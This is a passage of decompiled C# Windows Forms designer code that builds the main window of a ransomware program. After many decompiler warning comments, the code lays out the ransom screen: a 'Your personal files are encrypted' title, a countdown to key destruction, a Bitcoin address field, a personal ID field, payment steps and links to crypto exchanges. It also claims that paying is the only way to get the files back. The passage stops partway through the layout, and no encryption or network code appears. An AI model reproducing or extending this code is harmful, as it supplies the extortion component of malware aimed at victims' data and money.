		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected O, but got Unknown
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Expected O, but got Unknown
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0247: Expected O, but got Unknown
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Expected O, but got Unknown
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_025d: Expected O, but got Unknown
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_0274: Unknown result type (might be due to invalid IL or missing references)
		//IL_027e: Expected O, but got Unknown
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0289: Expected O, but got Unknown
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0294: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_029f: Expected O, but got Unknown
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02aa: Expected O, but got Unknown
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Expected O, but got Unknown
		//IL_02b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c0: Expected O, but got Unknown
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_02e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ec: Expected O, but got Unknown
		//IL_02ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Expected O, but got Unknown
		//IL_02f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0302: Expected O, but got Unknown
		//IL_0303: Unknown result type (might be due to invalid IL or missing references)
		//IL_030d: Expected O, but got Unknown
		//IL_030e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0318: Expected O, but got Unknown
		//IL_0319: Unknown result type (might be due to invalid IL or missing references)
		//IL_0323: Expected O, but got Unknown
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_032e: Expected O, but got Unknown
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected O, but got Unknown
		//IL_033a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0344: Expected O, but got Unknown
		//IL_0345: Unknown result type (might be due to invalid IL or missing references)
		//IL_034f: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Expected O, but got Unknown
		//IL_0366: Unknown result type (might be due to invalid IL or missing references)
		//IL_0370: Expected O, but got Unknown
		//IL_0371: Unknown result type (might be due to invalid IL or missing references)
		//IL_037b: Expected O, but got Unknown
		//IL_0454: Unknown result type (might be due to invalid IL or missing references)
		//IL_045e: Expected O, but got Unknown
		//IL_04db: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e5: Expected O, but got Unknown
		//IL_0585: Unknown result type (might be due to invalid IL or missing references)
		//IL_058f: Expected O, but got Unknown
		//IL_0609: Unknown result type (might be due to invalid IL or missing references)
		//IL_0613: Expected O, but got Unknown
		//IL_068d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0697: Expected O, but got Unknown
		//IL_0750: Unknown result type (might be due to invalid IL or missing references)
		//IL_075a: Expected O, but got Unknown
		//IL_0a12: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a1c: Expected O, but got Unknown
		//IL_0a46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aaf: Expected O, but got Unknown
		//IL_0b2d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b37: Expected O, but got Unknown
		//IL_0bc1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bcb: Expected O, but got Unknown
		//IL_0c65: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6f: Expected O, but got Unknown
		//IL_0cec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf6: Expected O, but got Unknown
		//IL_0d80: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d8a: Expected O, but got Unknown
		//IL_0e07: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e11: Expected O, but got Unknown
		//IL_0e9b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea5: Expected O, but got Unknown
		//IL_0f3f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f49: Expected O, but got Unknown
		//IL_0fc6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd0: Expected O, but got Unknown
		//IL_105a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1064: Expected O, but got Unknown
		//IL_10ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_10f8: Expected O, but got Unknown
		//IL_1182: Unknown result type (might be due to invalid IL or missing references)
		//IL_118c: Expected O, but got Unknown
		//IL_1216: Unknown result type (might be due to invalid IL or missing references)
		//IL_1220: Expected O, but got Unknown
		//IL_12aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_12b4: Expected O, but got Unknown
		//IL_1341: Unknown result type (might be due to invalid IL or missing references)
		//IL_134b: Expected O, but got Unknown
		//IL_13d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_13df: Expected O, but got Unknown
		//IL_146c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1476: Expected O, but got Unknown
		//IL_1503: Unknown result type (might be due to invalid IL or missing references)
		//IL_150d: Expected O, but got Unknown
		//IL_1597: Unknown result type (might be due to invalid IL or missing references)
		//IL_15a1: Expected O, but got Unknown
		//IL_1628: Unknown result type (might be due to invalid IL or missing references)
		//IL_1632: Expected O, but got Unknown
		//IL_16b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_16c3: Expected O, but got Unknown
		//IL_174a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1754: Expected O, but got Unknown
		//IL_17e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_17f1: Expected O, but got Unknown
		//IL_1879: Unknown result type (might be due to invalid IL or missing references)
		//IL_1883: Expected O, but got Unknown
		//IL_190b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1915: Expected O, but got Unknown
		//IL_1abd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b10: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b1a: Expected O, but got Unknown
		//IL_1ba4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bae: Expected O, but got Unknown
		//IL_1e44: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e97: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ea1: Expected O, but got Unknown
		//IL_1f28: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f32: Expected O, but got Unknown
		//IL_2039: Unknown result type (might be due to invalid IL or missing references)
		//IL_2043: Expected O, but got Unknown
		//IL_2066: Unknown result type (might be due to invalid IL or missing references)
		//IL_2070: Expected O, but got Unknown
		//IL_20ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_20f7: Expected O, but got Unknown
		//IL_217e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2188: Expected O, but got Unknown
		//IL_228c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2296: Expected O, but got Unknown
		//IL_22a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_22b3: Expected O, but got Unknown
		//IL_23ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_23c4: Expected O, but got Unknown
		//IL_244e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2458: Expected O, but got Unknown
		//IL_246b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2475: Expected O, but got Unknown
		//IL_2579: Unknown result type (might be due to invalid IL or missing references)
		//IL_2583: Expected O, but got Unknown
		//IL_2596: Unknown result type (might be due to invalid IL or missing references)
		//IL_25a0: Expected O, but got Unknown
		//IL_262a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2634: Expected O, but got Unknown
		//IL_273b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2745: Expected O, but got Unknown
		//IL_2758: Unknown result type (might be due to invalid IL or missing references)
		//IL_2762: Expected O, but got Unknown
		//IL_28ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_2942: Unknown result type (might be due to invalid IL or missing references)
		//IL_294c: Expected O, but got Unknown
		//IL_29e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_29f0: Expected O, but got Unknown
		//IL_2a6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a74: Expected O, but got Unknown
		//IL_2afe: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b08: Expected O, but got Unknown
		//IL_2b92: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b9c: Expected O, but got Unknown
		//IL_2c23: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c2d: Expected O, but got Unknown
		//IL_2d2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d38: Expected O, but got Unknown
		//IL_2d4b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d55: Expected O, but got Unknown
		//IL_2e59: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e63: Expected O, but got Unknown
		//IL_2e76: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e80: Expected O, but got Unknown
		//IL_2f10: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f1a: Expected O, but got Unknown
		//IL_3017: Unknown result type (might be due to invalid IL or missing references)
		//IL_3021: Expected O, but got Unknown
		//IL_30ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_30b8: Expected O, but got Unknown
		//IL_30cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_30d5: Expected O, but got Unknown
		//IL_315f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3169: Expected O, but got Unknown
		//IL_31f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_31fa: Expected O, but got Unknown
		//IL_328d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3297: Expected O, but got Unknown
		//IL_3310: Unknown result type (might be due to invalid IL or missing references)
		//IL_331a: Expected O, but got Unknown
		//IL_3406: Unknown result type (might be due to invalid IL or missing references)
		//IL_3410: Expected O, but got Unknown
		//IL_35e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_35eb: Expected O, but got Unknown
		//IL_3617: Unknown result type (might be due to invalid IL or missing references)
		//IL_3621: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		label1 = new Label();
		TimeReminderLabel = new Label();
		DestroyTimeLabel = new Label();
		Timer = new Timer(components);
		TimeLeftLabel = new Label();
		TimerLabel = new Label();
		TitleLabel = new Label();
		tabControl1 = new TabControl();
		tabPage1 = new TabPage();
		label38 = new Label();
		label22 = new Label();
		label21 = new Label();
		PersonalIDTextBox = new TextBox();
		label20 = new Label();
		EmailLabel = new Label();
		label18 = new Label();
		label17 = new Label();
		BTCAddressTextBox = new TextBox();
		label16 = new Label();
		label15 = new Label();
		label14 = new Label();
		label12 = new Label();
		label11 = new Label();
		label10 = new Label();
		label9 = new Label();
		label8 = new Label();
		label7 = new Label();
		label6 = new Label();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		HowToPayLabel = new Label();
		HowToDecryptLabel = new Label();
		WhatHappenLabel = new Label();
		tabPage2 = new TabPage();
		label35 = new Label();
		label39 = new Label();
		tabControl2 = new TabControl();
		tabPage3 = new TabPage();
		label29 = new Label();
		label19 = new Label();
		BlockChainlinkLabel = new LinkLabel();
		BTCAddressTextBox2 = new TextBox();
		label30 = new Label();
		label37 = new Label();
		LocalBitcoinslinkLabel = new LinkLabel();
		label36 = new Label();
		CoinCafelinkLabel = new LinkLabel();
		BTCDirectlinkLabel = new LinkLabel();
		label34 = new Label();
		CEXlinkLabel = new LinkLabel();
		label33 = new Label();
		label32 = new Label();
		HowToBuylinkLabel = new LinkLabel();
		label31 = new Label();
		tabPage4 = new TabPage();
		label46 = new Label();
		BTCAddressTextBox3 = new TextBox();
		label45 = new Label();
		label44 = new Label();
		label43 = new Label();
		label42 = new Label();
		PMBitcoinLinkLabel = new LinkLabel();
		label40 = new Label();
		PerfectMoneyLinkLabel = new LinkLabel();
		label41 = new Label();
		label28 = new Label();
		GetStartLinkLabel = new LinkLabel();
		BTCHomeLinkLabel = new LinkLabel();
		label27 = new Label();
		label26 = new Label();
		label25 = new Label();
		label24 = new Label();
		label23 = new Label();
		pictureBox1 = new PictureBox();
		label13 = new Label();
		LockerPicBox = new PictureBox();
		((Control)tabControl1).SuspendLayout();
		((Control)tabPage1).SuspendLayout();
		((Control)tabPage2).SuspendLayout();
		((Control)tabControl2).SuspendLayout();
		((Control)tabPage3).SuspendLayout();
		((Control)tabPage4).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)LockerPicBox).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_BackColor(SystemColors.ControlDark);
		((Control)label1).set_Location(new Point(316, 6));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(2, 720));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("label1");
		((Control)TimeReminderLabel).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)TimeReminderLabel).set_ForeColor(SystemColors.Info);
		((Control)TimeReminderLabel).set_Location(new Point(27, 361));
		((Control)TimeReminderLabel).set_Name("TimeReminderLabel");
		((Control)TimeReminderLabel).set_Size(new Size(273, 25));
		((Control)TimeReminderLabel).set_TabIndex(2);
		((Control)TimeReminderLabel).set_Text("Your KEY will be destroyed on");
		((Control)DestroyTimeLabel).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)DestroyTimeLabel).set_ForeColor(SystemColors.Info);
		((Control)DestroyTimeLabel).set_Location(new Point(27, 392));
		((Control)DestroyTimeLabel).set_Name("DestroyTimeLabel");
		((Control)DestroyTimeLabel).set_Size(new Size(273, 25));
		((Control)DestroyTimeLabel).set_TabIndex(3);
		Timer.set_Enabled(true);
		Timer.set_Interval(1000);
		Timer.add_Tick((EventHandler)Timer_Tick);
		((Control)TimeLeftLabel).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)TimeLeftLabel).set_ForeColor(SystemColors.Info);
		((Control)TimeLeftLabel).set_Location(new Point(100, 525));
		((Control)TimeLeftLabel).set_Name("TimeLeftLabel");
		((Control)TimeLeftLabel).set_Size(new Size(100, 25));
		((Control)TimeLeftLabel).set_TabIndex(4);
		((Control)TimeLeftLabel).set_Text("Time Left");
		((Control)TimerLabel).set_Font(new Font("Arial", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)TimerLabel).set_ForeColor(Color.Gold);
		((Control)TimerLabel).set_Location(new Point(19, 566));
		((Control)TimerLabel).set_Name("TimerLabel");
		((Control)TimerLabel).set_Size(new Size(273, 40));
		((Control)TimerLabel).set_TabIndex(5);
		TimerLabel.set_TextAlign((ContentAlignment)32);
		((Control)TitleLabel).set_Font(new Font("Arial", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)TitleLabel).set_ForeColor(Color.Red);
		((Control)TitleLabel).set_Location(new Point(586, 17));
		((Control)TitleLabel).set_Name("TitleLabel");
		((Control)TitleLabel).set_Size(new Size(466, 40));
		((Control)TitleLabel).set_TabIndex(6);
		((Control)TitleLabel).set_Text("Your personal files are encrypted");
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage1);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage2);
		((Control)tabControl1).set_Cursor(Cursors.get_Default());
		((Control)tabControl1).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)tabControl1).set_Location(new Point(324, 54));
		((Control)tabControl1).set_Name("tabControl1");
		tabControl1.set_SelectedIndex(0);
		((Control)tabControl1).set_Size(new Size(933, 673));
		((Control)tabControl1).set_TabIndex(7);
		((Control)tabPage1).set_BackColor(SystemColors.WindowText);
		((Control)tabPage1).get_Controls().Add((Control)(object)label38);
		((Control)tabPage1).get_Controls().Add((Control)(object)label22);
		((Control)tabPage1).get_Controls().Add((Control)(object)label21);
		((Control)tabPage1).get_Controls().Add((Control)(object)PersonalIDTextBox);
		((Control)tabPage1).get_Controls().Add((Control)(object)label20);
		((Control)tabPage1).get_Controls().Add((Control)(object)EmailLabel);
		((Control)tabPage1).get_Controls().Add((Control)(object)label18);
		((Control)tabPage1).get_Controls().Add((Control)(object)label17);
		((Control)tabPage1).get_Controls().Add((Control)(object)BTCAddressTextBox);
		((Control)tabPage1).get_Controls().Add((Control)(object)label16);
		((Control)tabPage1).get_Controls().Add((Control)(object)label15);
		((Control)tabPage1).get_Controls().Add((Control)(object)label14);
		((Control)tabPage1).get_Controls().Add((Control)(object)label12);
		((Control)tabPage1).get_Controls().Add((Control)(object)label11);
		((Control)tabPage1).get_Controls().Add((Control)(object)label10);
		((Control)tabPage1).get_Controls().Add((Control)(object)label9);
		((Control)tabPage1).get_Controls().Add((Control)(object)label8);
		((Control)tabPage1).get_Controls().Add((Control)(object)label7);
		((Control)tabPage1).get_Controls().Add((Control)(object)label6);
		((Control)tabPage1).get_Controls().Add((Control)(object)label5);
		((Control)tabPage1).get_Controls().Add((Control)(object)label4);
		((Control)tabPage1).get_Controls().Add((Control)(object)label3);
		((Control)tabPage1).get_Controls().Add((Control)(object)label2);
		((Control)tabPage1).get_Controls().Add((Control)(object)HowToPayLabel);
		((Control)tabPage1).get_Controls().Add((Control)(object)HowToDecryptLabel);
		((Control)tabPage1).get_Controls().Add((Control)(object)WhatHappenLabel);
		((Control)tabPage1).set_Font(new Font("Cambria", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		tabPage1.set_Location(new Point(4, 31));
		((Control)tabPage1).set_Name("tabPage1");
		((Control)tabPage1).set_Padding(new Padding(3));
		((Control)tabPage1).set_Size(new Size(925, 638));
		tabPage1.set_TabIndex(0);
		((Control)tabPage1).set_Text("What happened");
		label38.set_FlatStyle((FlatStyle)0);
		((Control)label38).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label38).set_ForeColor(SystemColors.Info);
		((Control)label38).set_Location(new Point(10, 584));
		((Control)label38).set_Name("label38");
		((Control)label38).set_Size(new Size(783, 25));
		((Control)label38).set_TabIndex(33);
		((Control)label38).set_Text("For detailed information, you can also read the file \"ReadMe.txt\" on your desktop.");
		((Control)label22).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label22).set_ForeColor(SystemColors.Control);
		((Control)label22).set_Location(new Point(10, 552));
		((Control)label22).set_Name("label22");
		((Control)label22).set_RightToLeft((RightToLeft)0);
		((Control)label22).set_Size(new Size(549, 22));
		((Control)label22).set_TabIndex(32);
		((Control)label22).set_Text("     Please keep checking your email.");
		((Control)label21).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label21).set_ForeColor(SystemColors.Control);
		((Control)label21).set_Location(new Point(10, 529));
		((Control)label21).set_Name("label21");
		((Control)label21).set_RightToLeft((RightToLeft)0);
		((Control)label21).set_Size(new Size(901, 22));
		((Control)label21).set_TabIndex(31);
		((Control)label21).set_Text("3. You will receive a decryptor and your private key to recover all your files within one working day.");
		((Control)PersonalIDTextBox).set_BackColor(SystemColors.WindowText);
		((Control)PersonalIDTextBox).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)PersonalIDTextBox).set_ForeColor(Color.Gold);
		((Control)PersonalIDTextBox).set_Location(new Point(243, 483));
		((Control)PersonalIDTextBox).set_Name("PersonalIDTextBox");
		((TextBoxBase)PersonalIDTextBox).set_ReadOnly(true);
		((Control)PersonalIDTextBox).set_Size(new Size(430, 29));
		((Control)PersonalIDTextBox).set_TabIndex(30);
		((Control)label20).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label20).set_ForeColor(SystemColors.Control);
		((Control)label20).set_Location(new Point(74, 488));
		((Control)label20).set_Name("label20");
		((Control)label20).set_RightToLeft((RightToLeft)0);
		((Control)label20).set_Size(new Size(162, 22));
		((Control)label20).set_TabIndex(29);
		((Control)label20).set_Text("    Your Personal ID is");
		((Control)EmailLabel).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)EmailLabel).set_ForeColor(Color.Gold);
		((Control)EmailLabel).set_Location(new Point(611, 446));
		((Control)EmailLabel).set_Name("EmailLabel");
		((Control)EmailLabel).set_RightToLeft((RightToLeft)0);
		((Control)EmailLabel).set_Size(new Size(290, 22));
		((Control)EmailLabel).set_TabIndex(28);
		((Control)label18).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label18).set_ForeColor(SystemColors.Control);
		((Control)label18).set_Location(new Point(10, 449));
		((Control)label18).set_Name("label18");
		((Control)label18).set_RightToLeft((RightToLeft)0);
		((Control)label18).set_Size(new Size(609, 22));
		((Control)label18).set_TabIndex(26);
		((Control)label18).set_Text("2. After making a payment with BTC, please send your personal ID to our official email: ");
		((Control)label17).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label17).set_ForeColor(SystemColors.Control);
		((Control)label17).set_Location(new Point(10, 423));
		((Control)label17).set_Name("label17");
		((Control)label17).set_RightToLeft((RightToLeft)0);
		((Control)label17).set_Size(new Size(901, 22));
		((Control)label17).set_TabIndex(25);
		((Control)label17).set_Text("    For further information about BTC, please refer to the next \"Payment Tab\".");
		((Control)BTCAddressTextBox).set_BackColor(SystemColors.WindowText);
		((Control)BTCAddressTextBox).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)BTCAddressTextBox).set_ForeColor(Color.Gold);
		((Control)BTCAddressTextBox).set_Location(new Point(243, 382));
		((Control)BTCAddressTextBox).set_Name("BTCAddressTextBox");
		((TextBoxBase)BTCAddressTextBox).set_ReadOnly(true);
		((Control)BTCAddressTextBox).set_Size(new Size(430, 29));
		((Control)BTCAddressTextBox).set_TabIndex(24);
		((Control)label16).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label16).set_ForeColor(SystemColors.Control);
		((Control)label16).set_Location(new Point(10, 353));
		((Control)label16).set_Name("label16");
		((Control)label16).set_RightToLeft((RightToLeft)0);
		((Control)label16).set_Size(new Size(901, 22));
		((Control)label16).set_TabIndex(22);
		((Control)label16).set_Text("    money  to 1 Bitcoin, and then send it to the following receiving address.");
		((Control)label15).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label15).set_ForeColor(SystemColors.Control);
		((Control)label15).set_Location(new Point(10, 331));
		((Control)label15).set_Name("label15");
		((Control)label15).set_RightToLeft((RightToLeft)0);
		((Control)label15).set_Size(new Size(901, 22));
		((Control)label15).set_TabIndex(21);
		((Control)label15).set_Text("1. For the security of transactions, all the payment must be completed via Bitcoin network. Thus, you need to exchange some\r\n");
		((Control)label14).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label14).set_ForeColor(SystemColors.Control);
		((Control)label14).set_Location(new Point(10, 308));
		((Control)label14).set_Name("label14");
		((Control)label14).set_RightToLeft((RightToLeft)0);
		((Control)label14).set_Size(new Size(901, 22));
		((Control)label14).set_TabIndex(20);
		((Control)label14).set_Text("There are three steps to make a payment and recover your files.");
		((Control)label12).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label12).set_ForeColor(SystemColors.Control);
		((Control)label12).set_Location(new Point(10, 242));
		((Control)label12).set_Name("label12");
		((Control)label12).set_RightToLeft((RightToLeft)0);
		((Control)label12).set_Size(new Size(901, 22));
		((Control)label12).set_TabIndex(19);
		((Control)label12).set_Text("you'd better not waste your time, because there is no other way to recover your files except making a payment.");
		((Control)label11).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_ForeColor(SystemColors.Control);
		((Control)label11).set_Location(new Point(10, 220));
		((Control)label11).set_Name("label11");
		((Control)label11).set_RightToLeft((RightToLeft)0);
		((Control)label11).set_Size(new Size(901, 22));
		((Control)label11).set_TabIndex(18);
		((Control)label11).set_Text("automatically by our server. All your files will be permanently encrypted and nobody can recover them. Therefore, it is advised that");
		((Control)label10).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(SystemColors.Control);
		((Control)label10).set_Location(new Point(148, 198));
